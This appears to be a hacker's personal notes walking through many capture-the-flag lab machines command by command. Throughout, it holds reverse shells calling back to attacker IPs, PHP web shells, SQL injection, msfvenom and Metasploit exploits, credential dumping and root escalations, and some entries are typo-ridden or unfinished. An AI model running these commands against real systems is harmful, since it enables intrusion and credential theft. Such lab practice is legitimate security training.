		##got credz tlavel:Fabricorp01
smbclient -L 10.10.10.180 -U tlavel
smbpasswd -r 10.10.10.180 -U tlavel
rpcclient -L 10.10.10.180 -U tlavel
>enumdomusers
		##got userlist
>enumprinters
		##got credz  $fab@s3Rv1ce$1
msfconsole
>use auxiliary/scanner/winrm/winrm_login
>set rhost 10.10.10.180
>set user_file user.txt
>set password $fab@s3Rv1ce$1
>exploit
		##got credz svc-print:$fab@s3Rv1ce$1
evil-winrm -i fuse.htb -u svc-print -p '$fab@s3Rv1ce$1'
>whoami /all
		##got privesc SeLoadDriverPrivilege         Load and unload device drivers Enabled
		##souce: https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/
		##not complete yet because cant compile .cpp file
		






Magic HTB
====================================
pport=$(nmap -Pn -p- --min-rate=10000 -T4 10.10.10.185 | grep ^[0-9] | cut -d "/" -f1 | tr "\n" "," | sed s/,$//); nmap -sC -sV -A -p $pport 10.10.10.185 -o nmap
dirb http://10.10.10.185 -X .php
http://10.10.10.185/login.php
		##login with sql 'or 1=1-- -
http://10.10.10.185/upload.php
		##or without logit but intercept response upload.php from 302 Found to 2-- OK
		##change config on burp to replace 302 Found to 200 OK
		##upload shell 5hell.php.jpg
		##<php echo shell_exec($_GET['c']);?>
http://10.10.10.185/image/uploads/5hell.php?c=whoami
http://10.10.10.185/image/uploads/5hell.php?c=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.86/4343 0>&1'
nc -lvp 4343
>whoami
>cat db.php5
>mysqldump Magic -utheseus -piamkingtheseus
		##got credz admin:Th3s3usW4sK1ng
>su theseus
>cd .ssh
ssh-keygen
cat id_rsa.pub | xclip -selection primary
>vi authorized_keys
ssh theseus@10.10.10.185
>find / -user root -type f -perm -4000  -ls 2>/dev/null | grep -v snap
>/bin/sysinfo
>strings /bin/sysinfo
>cd /tmp
>touch lshw
		#!/bin/bash
		echo "rooot:`openssl passwd -1 -salt ignite godmode`:0:0:root:/root:/bin/bash" >> /etc/passwd
>chmod 777 lshw
>echo $PATH
>export PATH=/tmp:$PATH
>/bin/sysinfo
>su rooot




Buff HTB
====================================
git clone https://github.com/Tib3rius/AutoRecon
curl https://bootstrap.pypa.io/get-pip.py | sudo python
pip install --upgrade setuptools
python3 -m pip install requirements.txt
python3 aurecon.py 10.10.10.198
python autorecon.py 10.10.10.198
		##download exploit gym management software
		##https://www.exploit-db.com/exploits/48506
python exp.py http://10.10.10.198:8080/
>cp /usr/share/windows-binaries/nc.exe .
>cp /usr/share/windows-binaries/plink.exe .
>dir
http://10.10.10.198:8080/upload/kamehameha.php?telepathy=whoami
http://10.10.10.198:8080/upload/kamehameha.php?telepathy=nc 10.10.14.45 4141 -e cmd.exe
nc -lvp 4343
>whoami
>cd c:\users\shaun\download\
>dir
		##exploit cloudme 1.11
		##https://www.exploit-db.com/exploits/48389
>plink.exe -l root -pw eleven 10.10.14.45 -R 8888:127.0.0.1:8888
msfvenom -p windows/exec CMD='c:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.45 4242′ -b ‘\x00\x0a\x0d’ -f py -v payload
		##copy to exploit
nc -lvp 4242
python buff-exp.py





Blackfield HTB
====================================
python3 autorecon.py 10.10.10.192
smbclient -L 10.10.10.192
smbclient \\\\10.10.10.192\\profiles$
>dir
		##safe directory profiles to user list
cp /usr/share/doc/python3-impacket/example/GetNPusers.py .
ldapsearch -h 10.10.10.192 -x -s base namingcontexts
		##got active domain BLACKFIELD,LOCAL
python3 BLACKFIELD.LOCAL/ -usersfile users.txt -format john -outputfile hashes.txt -dc-ip 10.10.10.192
		##got kerberos hash user support
hashcat -m 18200 -a 0 -w 3 kerb.txt /home/rockyou.txt -o crack-kerb.txt --force
rpcclient 10.10.10.192 -U support
>enumdomusers
>enumdomgroups
>querydominfo
>querydispinfo
>queryuser 0x1f4
		##query detail domain admin activity
>setuserinfo2 audit2020 testing123@
>quit
smbclient \\\\10.10.10.192\\forensic -U audit2020
smb://10.10.10.192/forensic
>download lsass.zip
unzip lssass.zip
		##open with mimikatz windows
>sekurlsa::minidum lsass.DMP
>sekurlsa::logonpasswords
		##got credz user hash srv_backup
evil-winrm -i 10.10.10.192 -u srv_backup -H 9658d1d1dcd9250115e2205d9f48400d
>whoami /all
		##privsec SeBackupPrivilege https://github.com/giuliano108/SeBackupPrivilege
cat dskshdw.txt
		set context persistent nowriters
		add volume c: alias lol
		create
		expose %lol% x:	
>mkdir c:\tmp
>upload SeBackupPrivilegeUtils.dll
>upload SeBackupPrivilegeCmdLets.dll
>upload dskshdw.txt
>diskshadow /s dskshdw.txt
>Import-Module .\SeBackupPrivilegeUtils.dll
>Import-Module .\SeBackupPrivilegeCmdLets.dll
>Set-SeBackupPrivilege
>Copy-FileSeBackupPrivilege x:\Windows\NTDS\ntds.dit C:\tmp\ntds.dit
>reg save HKLM\SYSTEM c:\tmp\system
>download system
>download ntds.dit
cp /usr/share/doc/python3-impacket/example/secretdump.py .
python3 secretdump.py -ntds ntds.dit -system system -hashes lmhash:nthash LOCAL -output crck-ntds.txt
evil-winrm -i 10.10.10.192 -u Administrator -H 184fbmf09u88orijh788gg189ee
>whoami
>type ../Desktop/root.txt




Blue THM
====================================
nmap -Pn -p- --min-rate=10000 -T4 10.10.167.228
nmap -p 445 --script smb-vuln-ms17-010 10.10.167.228
msfconsole
>use exploit/windows/smb/ms17_010_eternalblue
>set rhost 10.10.167.228
>run
>whoami
>cd c:/users/
>dir /s *.txt





GoldenEye
===================================
python3 autorecon.py 10.1.1.56
http://10.1.1.56/
http://10.1.1.56/terminal.js
		##got credz boris with passwd encoded with html
http://10.1.1.56/sev-home/
cp /usr.share/wordlist/fasttrack.txt .
hydra -l boris -P fasttrack.txt -f 10.1.1.56 -s 55007 pop3
		##got credz boris:secret1!
telnet 10.1.1.56 55007
>user boris
>pass secret1!
>list
>retr 1
hydra -l natalya -P fasttrack.txt -f 10.1.1.56 -s 55007 pop3
		##got credz natalya:bird
>user natalya
>pass bird
>list
>retr 2
		##got credz xenia:RPC90rulez!
nano /etc/hosts
		##10.1.1.56	servernaya-station.com
http://severnaya-station.com/gnocertdir
		##login and show message from Doak
hydra -l doak -P fasttrack.txt -f 10.1.1.56 -s 55007 pop3
		##got credz doak:goat
>user doak
>pass goat
>list
>retr 1
		##got credz doak:4England!
http://severnaya-station.com/gnocertdir/login
http://severnaya-station.com/gnocertdir/user/files.php
wget http://severnaya-station.com/dir007key/for-007.jpg
file for-007.jpg
exiftool for-007.jpg
		##got credz admin:xWinter1995x!
http://severnaya-station.com/gnocertdir/login
http://severnaya-station.com/gnocertdir/admin/settings.php?section=systempaths
		##RCE moodle on spell check mode
		##add python reverse shell
		##python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.1.1.56",4141));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
		##edit Text editor –>tinyMCEHTML –>settings -> googlespell ->pshellspell
nc -lvp 4141
		##request spellcheck and got shell
>python -c 'import pty;pty.spawn("/bin/bash")'
>^Z
stty raw -echo
fg
reset
>uname-a
>cat /etc/lsb-release
searchsploit ubuntu 14.02
>which gcc
>locate gcc
>which cc
wget https://www.exploit-db.com/download/37292.c
searchsploit -m 37292.c
		##edit gcc to cc
>cc exp.c -o exp
>./exp
>cat /root/.flag.txt







Weakness a.k.a w34kn3ss
===================================
autorecon 10.1.1.57
dirb http://10.1.1.57
dirb https://10.1.1.57
cat result/10.1.1.57/scans/tcp_445_sslscan.txt
nano /etc/hosts
		##10.1.1.57		weakness.jth
http://weakness.jth
dirb http://weakness.jth
http://weakness.jth/private/files/note.txt
		##generated by openssl 0.9.8c-1
wget http://weakness.jth/private/files/mykey.pub
searchsploit openssl 0.9
searchsploit -m 5720
cat 5720.py
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2 
tar -xfv debian_ssh_rsa_2048_x86.tar.bz2
cd rsa/2048
grep -l -r `cat mykey.pub`
		##got exact file 4161de56829de2fe64b9055711f531c1-2537.pub
ssh n30@10.1.1.57 -i 4161de56829de2fe64b9055711f531c1-2537
>which nc
nc -lvp 4141 > code
>nc 10.1.1.5 4141 < code
>python code
file code
mv code code.pyc
pip install uncompyle6
uncompyle6 code
		##got credz n30:dMASDNB!!#B!#!#33
>sudo -l
>sudo su





Toppo
===================================
autorecon 10.1.1.58
http://10.1.1.58/admin/notes.txt
		##got pass 12345ted123
ssh ted@10.1.1.58
>which sudo
nc -lvp 4141 < liepas.sh
>nc 10.1.1.5 4141 > linpeas.sh
>./linpeas.sh
		##awk/mawk privsc
awk 'BEGIN {system("/bin/sh")}'
awk '//' "/etc/shadow"
		##python2.7 privsc
python -c 'import pty;pty.spawn("/bin/sh")'






Bob 1
==========================================
python3 autorecon.py 10.1.1.59
http://10.1.1.59/robots.txt
view-source:http://10.1.1.59/news.html
		##got hint passwords.html
http://10.1.1.59/passwords.html
		##got credz jc:Qwerty seb:Titanium_Pa$$word_H4cker
http://10.1.1.59/dev_shell.php
		##which ping
		##/bin/ping 10.1.5
tcpdump -in eth0 icmp
http://10.1.1.59/dev_shell.php
		##which nc
		##/bin/nc -e /bin/bash 10.1.1.5 4141 		
nc -lvp 4141
ssh jc@10.1.1.59 -p 25468
>cat /home/elliot/theadminisdumb.txt
		##got credz elliot:theadminisdumb
>su elliot
>sudo -l
>cd /home/bob/Document/
>file login.txt.gpg
>gpg -d login.txt.gpg
>gpg --batch --passphrase HARPOCRATES -d login.txt.gpg
		##use pass from file inside dir bob HARPOCRATES
		##got credz bob:b0bcat_
>su bob
>sudo -l
>sudo su







Breach 1
=====================================
python3 autorecon.py 192.168.110.140
dirb http://breach1
view-source:http://breach1
		##2x base64 decurypt and got credz pgibbons:damnitfeel$goodtobeagang$ta
dump http://breach/images/
exiftool bill.jpg
http://breach/initech.html
http://breach/impresscms/
		##login with pgibbons
		##read message and content
wget http://breach/.keystroke
wget http://breach/impresscms/_SSL_test_phase1.pcap
		#download both content and password keystrke=tomcat
mv .keystroke keystroke
file keystroke
		##decrypt SSL with wireshark and java key
		##conver keystroke to pk12
keytool -list -v -keystore keystore
keytool -v -importkeystore -srckeystore keystore -srcalias tomcat -destkeystore key_test.p12 -deststoretype PKCS12
keytool -importkeystore -srckeystore keystore -destkeystore key_test.p12 -srcstoretype JKS -deststoretype PKCS12 -srcstorepass tomcat -deststorepass tomcat -srcalias tomcat -srckeypass tomcat -destkeypass tomcat -noprompt 
openssl pkcs12 -in key_test.p12 -nocerts -nodes
wireshark &
		##decrypt wireshark pcap
		##open pcapfile _SSL_test_phase1.pcap
		##Select Edit -> Preferences -> Protocols -> TLS -> edit RSA Keys list
		##ip=192.168.110.140, port=80, key file=key_test.p12 password=tomcat
		##open TLSv1 log -> follow TLS Stream
		##got Authorization: Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC
		##encoded and got tomcat:Tt\5D8F(#!\*u=G)4m7zB
https://breach:8443
		##tomcat war file exploit
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.101 LPORT=4141 -f war > shell.war
nc -lvp 4141
https://breach:8443/shell
>python -c 'import pty;pty.spawn("/bin/bash")'
>mysql impresscms -u root
>>show databases;
>>use mysql;
>>select User,Password from user;
		##got credz milton md5 hash
		##cracked in crackstation.net milton:thelaststraw
>su milton
>sudo -l
exiftool images/bill.jpg
		##comment: coffeestrains
>su blumbergh
>sudo -l
		##tee privsc
>echo 'cat exp.txt' | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh
>su rooot
		##got another privsc but need reboot
		##/etc/init.d writable
>nano /etc/init.d/portly.sh
#reboot
nc -lvp 4141





Breach 2
===================================
python3 autorecon.py 192.168.110.151
ssh 192.168.110.151 -p 65535
		##got hint the passwd is in the source and the passswd actually is inthesource
		##create wordlist every word
https://design215/toolbox/wordlist.php
ssh peter@192.168.110.151 -p 65535
		##nmap again an port 8888 is now open
dirb http://192.168.110.151/
dirb http://192.168.110.151/blog/ -X .php,.html,.txt,.db
http://192.168.110.151/blog/index.html?search='
sqlmap -u http://192.168.110.151/blog/index.html?search=1 --dbs
sqlmap -u http://192.168.110.151/blog/index.html?search=1 --dbs -D oscommerce --tables
sqlmap -u http://192.168.110.151/blog/index.html?search=1 --dbs -D oscommerce -T osc_administrators --dump
		##got admin:32admin cracked in hashkiller
http://192.168.110.151/blog/register.html
		##old BlogPHP cms exploited with Stored XXS
		##https://www.exploit-db.com/exploits/17640
apt-get install beef-xss
beef-xxs
		##register with this user
		##<META http-equiv="refresh" content="0;URL=http://192.168.110.101:3000/demos/butcher/index.html">
http://192.168.110.151/blog/member.html
		##got stored XXS and the server using old Firefox 15/0
		##https://www.rapid7.com/db/modules/exploit/multi/browser/firefox_proto_crmfrequest
msfconsole
>use exploit/multi/browser/firefox-proto_crmfrequest
>show payloads
>set paypload generic/shell_reverse_tcp
>set srvhost 192.168.110.101
>set srvport 8888
>set uripath shell
>set lhost 192.168.110.101
>exploit
		##open beef 192.168.110.151 -> commands -> misc -> iFrame event logger > http://192.168.110.101:8888/shell
		##execute
>sessions -i
>use post/multi/manage/shell_to_meterpreter
>set session 1
>exploit
		##got another sessions with meterpreter
>sessions -i 2
>sysinfo
>shell
>netstat -plnta
>telnet 127.0.0.1 2323
		##got coordinate and lookup it then got Houston City
>user:hamilton
>pass:Houston
>find /usr –user milton
>cat /usr/local/bin/cd.py
>mine
		##got shell as user milton
>netstat -tln
http://192.168.110.151:8888/oscommerce/
http://192.168.110.151:8888/oscommerce/admin
		##login with admin:admin32
		##upload shell
nc -lvp 4141
>echo "import pty;pty.spawn('/bin/bash')" > /tmp/asd.py
>python /tmp/ads.py
>whoami
>sudo -l
		##tcpdump privsc
>echo $'id\n/bin/netcat 192.168.110.101 4321 –e /bin/bash' > /tmp/exp.sh
>chmod +x exp.sh
>sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/exp.sh -Z root
nc -lvp 4321
>id
>python .flag.py





Breach 3
===================================
python3 autorecon.py 10.1.1.60
snmpwalk -v 2c -c public 10.1.1.60
		##got STRING: "Email: Milton@breach.local - (545)-232-1876
knock -v 10.1.1.60 545 232 1876
nmap -Pn -p- --min-rate=10000 -T4 10.1.1.60
		##got new open port TCP
ssh 10.1.1.60
		##got banner "call at 555-432-1800"
knock -v 10.1.1.60 555-432-1800
nmap -Pn -p- --min-rate=10000 -T4 10.1.1.60
http://10.1.1.60:8
		##use credz from breach2 milton:thelaststraw
dirb http://10.1.1.60:8/ -H ""Authorization: basic bWlsksfojijf09ujqjkdw=="
dirb http://10.1.1.60:8/ -H ""Authorization: basic bWlsksfojijf09ujqjkdw==" -X .php,.html,.txt,.log,.db
dirb http://10.1.1.60:8/breach3/ -H ""Authorization: basic bWlsksfojijf09ujqjkdw=="
		##SQLI login form
sqlmap -r req.txt --dbs --batch --level=5 --risk=3 --dbms=mysql --proxy=http://127.0.0.1:8080
sqlmap -r req.txt --dbs --batch --level=5 --risk=3 --dbms=mysql --proxy=http://127.0.0.1:8080 --tamper=equaltolike
sqlmap -r req.txt --dbs --batch --level=5 --risk=3 --dbms=mysql --proxy=http://127.0.0.1:8080 --tamper=equaltolike -D thebobs --dump
		##got credz admin:8f89jdj9081u3ijandvpa229
		##cracked on hashkiller.io admin:randomhash
		##sadly cant use it on login
sqlmap -r req.txt --dbs --batch --level=5 --risk=3 --dbms=mysql --proxy=http://127.0.0.1:8080 --tamper=equaltolike -D backup --dump
		##got credz blumbergh:c0ff335train
		##login sqli
username=admin&password=%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL--+asd&submit=+Login+' UNION ALL SELECT NULL,NULL,NULL-- asd
dirb http://10.1.1.60:8/breach3/thebobscloudhostingllc/ -H ""Authorization: basic bWlsksfojijf09ujqjkdw==" -X .php
		##got php page livechat.php
		##rce seacher parameter
http://10.1.1.60:8/breach3/thebobscloudhostingllc/livechat.php?searcher=ls
cat /root/.ssh/id_rsa.pub
http://10.1.1.60:8/breach3/thebobscloudhostingllc/livechat.php?searcher=sudo -l
		##im stuck cant get in






Lemonsqueezy
===================================
python3 autorecon.py 10.1.1.61
http://10.1.1.61
http://lemonsqueezy/wordpress/
wpscan --url http://lemonsqueezy/wordpress/ -e u,vp,vt
wpscan --url http://lemonsqueezy/wordpress/ -U user.txt -P /home/rockyou.txt
		##got credz orange:ginger
http://lemonsqueezy/wodpress/wp-admin/edit.php
		##got n01n@w0rdl1st
http://lemonsqueezy/phpmyadmin
		##use orange:n01n@w0rdl1st
		##change lemon user to godmode hash
		##vulnerable plugins themes
		##WpStore, store, eShop, KidzStore, emporium, framework, eCommerce
		##http://lastc0de.blogspot.com/2013/07/exploit-wordpress-themes-upload.html
http://lemonsqueezy/phpmyadmin/server_sql.php
		##phpmyadmin shell
		##query: select "<?php system($_GET['c']);?>" into outfile "/var/www/html/wordpress/shell.php"
http://lemonsqueezy/wordpress/shell.php?c=id
http://lemonsqueezy/wordpress/shell.php?c=/bin/nc -e /bin/bash 10.1.1.5 4141
nc -lvp 4141
>python -c 'import pty;pty.spawn("/bin/bash")'
>cd /home
>find .
>wget http://10.1.1.5:8888/linpeas.sh
>bash linpeas.sh
>ls -lah /etc/logrotate.d/logrotate
>vi /etc/logrotate.d/logrotate
		##add python reverse shell
		##import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.1.1.5",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
nc -lvp 4242
>whoami
>cat /root/flag








Sar
==================================
python3 autorecon.py 10.1.1.62
http://10.1.1.62/robots.txt
http://10.1.1.62/sar2HTML/
		##exploit sar2HTML 3.2.1 RCE
		##https://www.exploit-db.com/exploits/47204
http://10.1.1.62/sar2HTML/index.php?plot=;id
http://10.1.1.62/sar2HTML/index.php?plot=;wget 10.1.1.5:8888/shell.php
		##upload backdoor php
http://10.1.1.62/shell.php
>/usr/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.1.1.5:4242		
socat file:`tty`,raw,echo=0 TCP-L:4242
>id
>wget http://10.1.1.5:8888/linpeas.sh
>bash linpeas.sh
		##crontab exploit
>ls -lah /var/spool/cron/crontab
		##root crontab editable
>cat /etc/crontab
>ls -lah /var/www/html
		##file finnaly.sh owned by root execute write.sh
>vi /var/spool/cron/crontab/root
		##2 * * * * /var/www/html/finally.sh
>vi /var/www/html/write.sh
		##bash -c "bash -i >& /dev/tcp/10.1.1.5/4444 0>&1"
>chmod 755 write.sh
nc -lvp 4444
>id
>cat ~/root.txt







EVM
===================================
python3 autorecon.py 10.1.1.64
dirb http://10.1.1.64
http://10.1.1.64/wordpress/
		##wordpress is error template ip address
		##change response in burp to original ip address
wpscan --url http://10.1.1.64/wordpress/ -e u,vp,vt
wpscan --url http://10.1.1.64/wordpress/ -e vp --plugins-detection aggressive --proxy http://127.0.0.1:8080
wpscan --url http://10.1.1.64/wordpress/ -e vp wp-content-dir /wp-content/ --plugins-detection aggressive --proxy http://127.0.0.1:8080
wpscan --url http://10.1.1.64/wordpress/ -U user.txt -P /home/rockyou.txt
		##got credz c0rrupt3d_brain:484848
http://10.1.1.64/wordpress/wp-login.php
		##got plugin WordPress Plugin WP Vault 0.8.6.6 - LFI 
		##https://www.exploit-db.com/exploits/40850
http://10.1.1.64/wordpress/?wpv-image=../../../../../../../../../../etc/passwd
		##cant exit template 404.php
		##install file manager plugin and upload shell
http://10.1.1.64/wordpress/shell.php
		##pyhon reverse shell
>export RHOST="10.1.1.5";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
nc -lvp 4242
>python -c 'import pty;pty.spawn("/bin/bash")'
>cd /home/root3er
>ls -lah
>cat .root_password_ssh.txt
		##got root passwd willy26
>su root
>cat ~/proof.txt





TommyBoy
===================================
python3 autorecon.py 10.1.1.63
view-source:http://10.1.1.63/
http://10.1.1.63/robots.txt
http://10.1.1.63/flag-numero-uno.txt
		##flag1: B34rcl4ws
http://10.1.1.63/prehistoricforest/
http://10.1.1.63/prehistoricforest/thisisthesecondflagyayyou.txt
		##flag2: Z4l1nsky 
wpscan --url http://10.1.1.63/prehistoricforest/ -e u,vp,vt
http://10.1.1.63/richard/
wget http://10.1.1.63/richard/shockedrichard.jpg
exiftool shockedrichard.jpg
		##got hash decoded as spanky
		##open protected content with this passwd
http://10.1.1.63/prehistoricforest/index.php/2016/7/06/status-of-restoring-company-home-page/
		##port ftp 65534 open every 15 minutes with user nickburns:nickburns
nmap --Pn -p- --min-rate=10000 10.1.1.63
ftp 10.1.1.63 65534
>dir
>get readme.txt
cat readme.txt
		##there directory NickIzl33t
http://10.1.1.63:8008/NickIzl33t/
		##change User-Agent to iphone in burp
http://10.1.1.63:8008/NickIzl33t/
dirb http://10.1.1.63:8008/NickIzl33t/ /home/rockyou.txt -a "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" -X .html
		##dirb is ded, use gobuster
		##got fallon1.html
http://10.1.1.63:8008/NickIzl33t/fallon1.html
http://10.1.1.63:8008/NickIzl33t/flagtres.txt
		##flag3: TinyHead
wget http://10.1.1.63:8008/NickIzl33t/t0msp4ssw0rdz.zip
http://10.1.1.63:8008/NickIzl33t/hint.txt
crunch 13 13 -t bev,%%@@^1955 -o wordlist_tommy.txt
fcrackzip -D -u -p wordlist_tommy.txt t0msp4ssw0rdz.zip
		##got passwd bevHOOtr$1995
unzip t0msp4ssw0rdz.zip
cat passwords.txt
wpscan --url http://10.1.1.63/prehistoricforest/ -U user.txt -P /home/rockyou.txt
		##got hit tom:tomtom1
http://10.1.1.63/prehistoricforest/wp-admin/post.php?post=22&action=edit
		##combined credz with passwords.txt and get bigtommysenior:fatguyinalittlecoat1938!!
ssh bigtommysenior@10.1.1.63
>cat el-flag-numero-quatro.txt
		##flag4: EditButton
>cp /callalahan.bak /var/www/html/index.html
>ls -lah /
		##flag5 owned by www-data
		##find writeble directory as tommy to www-data
>find / -perm -2 -type d 2>/dev/null
>cd /var/thatsg0nnaleavemark/NickIzL33t/P4TCH_4D4MS/uploads/
nc -lvp 4141 < p0wny.php
>nc 10.1.1.5 4141 > shell.php
http://10.1.1.5:8008/NickIzL33t/P4TCH_4D4MS/uploads/shell.php
>cat /.5.txt
		##flag5: Buttcrack
>unzip /home/bigtommysenior/LOOT.zip
		##with passwd all flag
		##B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack
>cat THE-END.txt		
		






RickdiculouslyEasy 
===================================
python3 autorecon.py 10.1.1.65
ftp 10.1.1.65
>anonymous
>ls
>get FLAG.txt
cat FLAG.txt
		##flag1
http://10.1.1.65/robots.txt
http://10.1.1.65/passwords/FLAG.txt
		##flag2
view-source:http://10.1.1.65/passwords/password.html
		##got password winter
http://10.1.1.65/cgi-bin/tracertool.cgi?ip=10.1.1.5;id
http://10.1.1.65/cgi-bin/tracertool.cgi?ip=10.1.1.5;head /etc/passwd
hydra -L user.txt -p winter ssh://10.1.1.65:22222
		##got credz Summer:winter
ssh Summer@10.1.1.65 -p 22222
>find / -writable 2>/dev/null
>ls -lah /home/Morty
>nc 10.1.1.5 4141 < Safe_Password.jpg
>nc 10.1.1.5 4141 < journal.txt.zip
nc -lvp 4141 > safe_password.jpg
strings safe_password.jpg
		##got passwd zip Meeseek
file journal.txt.zip
unzip journal.txt.zip
>cp /home/RickSanchez/safe ~/
>./safe 131333
crunch 7 7 -t ,%Fleash -o rickpasswd.txt
crunch 10 10 -t ,%Curtains -o rickpasswd.txt
hydra -l RickSanchez -P rickpasswd.txt ssh://10.1.1.65:22222
		##got credz RickSanchez:P7Curtains
ssh RichSanchez@10.1.1.65 -p 22222
>sudo -l
>sudo su
>head -n 100 /root/FLAG.txt








Djinn
================================
python3 autorecon.py 10.1.1.66
ftp 10.1.1.66
>anonymous
>get creds.txt
>get game.txt
>get message.txt
telnet 10.1.1.66 1337
		##game with math question and solved with python pwntools
apt-get update
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
nano py-game.py
	#!/usr/bin/env python3
	from pwn import *
	c = remote('192.168.14.106',1337)
	c.recvuntil("\n\n", drop=True)
	# Loop 1000 times
	for i in range(1001):
		# read from ( to ,
		c.recvuntil("(", drop=True)
		int1 = c.recvuntil(",", drop=True)
		# read from ' to ,
		c.recvuntil("'", drop=True)
		mathsym = c.recvuntil("'", drop=True)
		# read from , to )
		c.recvuntil(", ", drop=True)
		int2 = c.recvuntil(")", drop=True)
		# calculate equation
		equation = int1+mathsym+int2
		print(str(i)+"th answer= "+str(equation))
		# send answer
		c.sendlineafter('>',equation)
	c.interactive()
python3 py-game.py
		##got 1356, 6784, 3409 which is port to knock
knock 10.1.1.66 1356 6784 3409
nmap -Pn -p- --min-rate=10000 10.1.1.66
http://10.1.1.66:7331
gobuster dir -u http://10.1.1.66:7331 -w /usr/share/wordlists/dirb/big.txt
http://10.1.1.66:7331/wish
		##filtered website rce
		##if pipe (|) enable then bypass with base64
http://10.1.1.66:7331/wish
		##cmd=echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0LjEwNy84MDgwIDA+JjEK | base64 -d | bash
nc -lvp 4141
>python -c 'import pty;pty.spawn("/bin/bash")'
>cat app.py | grep nitish
		##got CREDS = "/home/nitish/.dev/creds.txt"
>cd /home/nitish/
>cat .dev/creds.txt
		##got credz nitish:p4ssw0rdStr3r0n9
>su nitish
>sudo -l
		##genie privsc
>which genie
>genie -h
>genie -e id asd
>sudo -u sam genie -e id asd
>man genie
>sudo -u sam genie cmd asd
>bash
>whoami
>sudo -l
		##lago privsc
>sudo /root/lago
>cd .
>grep -ir naughtys .* 2>/dev/null
>grep -ir naughtys /home/* 2>/dev/null
>file /home/sam/.pyc
>nc 10.1.1.5 4444 < .pyc
nc -lvp 4444 > samgame.pyc
file samgame.pyc
uncompyle6 samgame.pyc
		##got shell if input num
>sudo /root/lago
>>2
>>num
>id
>bash
>whoami
>ls /root/
>bash proof.sh







Bravery
================================
python3 autorecon.py 10.1.1.67
http://10.1.1.67/robots.txt
showmount -e 10.1.1.67
mount -t nfs -o nfsvers=3 10.1.1.50:/home/nfs mnt/
cd mnt/
cat discovery
cat enumeration
cat explore
cat password.txt
cat qwertyuioplkjhgfdsazxcvbnm
		##unmount
df -k
umount /home/bravery/mnt
smbmap -H 10.1.1.67
smbclient \\\\10.10.10.192\\anonymous -U ""
		##smbdump
>mask ""
>recurse ON
>prompt OFF
>mget *
>exit
		##find words
find -ir pass *
ls -Rlah
ls -Rlah | grep -v "0 Sep"
smbclient \\\\10.10.10.192\\secured -U "David"
password: qwertyuioplkjhgfdsazxcvbnm
get david.txt
get genevieve.txt
get README.txt
http://10.1.1.67/geneieve/cuppaCMS/
searchsploit cuppa cms
searchsploit -m 25971
cat 25971.txt
http://10.1.1.67/geneieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=../../../../../../../etc/passwd
		##LFI base64 php cuppa CMS
http://10.1.1.67/geneieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
echo "LFI" | base64 -d
cat shell.php
		<?php system($_REQUEST['cmd']);?>
http://10.1.1.67/geneieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://10.1.1.5/shell.php&cmd=id
http://10.1.1.67/geneieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://10.1.1.5/shell.php&cmd=wget 10.1.1.5/p0wnie.php
http://10.1.1.67/geneieve/cuppaCMS/alerts/p0wnie.php
>0<&196;exec 196<>/dev/tcp/10.1.1.5/4242; sh <&196 >&196 2>&196
nc -lvp 4242
>wget 10.1.1.5/linpeas.sh
>bash linpeas.sh > linpeas.txt
>mysql -u "root" localhost -p
>>show databases;
>>use bravery;
		##describe table
>>describe cp_users;
>>select * from cp_users;
>>exit
>cat linpeas.txt
		##cp privsc
>cp /etc/shadow /dev/stdout
>cp etcshadow.txt /etc/shadow
>su rooot
		##no_root_squash/no_all_squash privsc
		##https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe





Mercy
===================================
python3 autorecon.py 10.1.1.69
http://10.1.1.69:8080
http://10.1.1.69:8080/robots.txt
http://10.1.1.69:8080/tryharder/tryharder
		##got txt base64 encoded, and decoded as password
smbmap -H 10.1.1.69
cat enum4linux.txt
		##got 4 user: pleadformercy,qiu,thisisasuperduperlonguser,fluffy
smbclient \\\\192.168.1.111\\qiu -U qiu
password: password
>mask ""
>recurse ON
>prompt OFF
>mget *
>exit
cat .secret/opensesame/config
		##knockd configuration
knock -v 10.1.1.69 159:tcp 27391:tcp 4:tcp
knock -v 10.1.1.69 17301 28504 9999
nmap -Pn --min-rate=10000 10.1.1.69
http://10.1.1.69
http://10.1.1.69/robots.txt
http://10.1.1.69/mercy/
http://10.1.1.69/nomercy/
searchsploit rips
		##rips lfi/RIPS LFI/rips LFI
http://10.1.1.69/nomercy/windows/code.php?file=../../../../../etc/passwd
http://10.1.1.69/nomercy/windows/code.php?file=../../../../../etc/tomcat7/tomcat-users.xml
		##got credz thisisasuperduperlonguser:heartbreakisinevitable
		##got credz fluffy:freakishfluffybunny
http://10.1.1.69:8080/manager
